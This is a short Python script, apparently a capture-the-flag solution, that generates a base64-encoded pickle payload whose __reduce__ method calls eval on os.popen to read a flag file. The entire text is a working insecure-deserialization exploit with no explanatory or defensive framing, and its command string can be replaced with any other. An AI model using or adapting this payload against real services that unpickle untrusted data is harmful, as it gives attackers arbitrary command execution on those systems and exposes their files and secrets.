import pickle, base64

class Exploit:
    def __reduce__(self):
        p="os.popen('cat ./flag.txt').read()"
        return (eval,(p,))
 
obj = {'name':Exploit()}
 
print(base64.b64encode(pickle.dumps(obj)).decode('utf8'))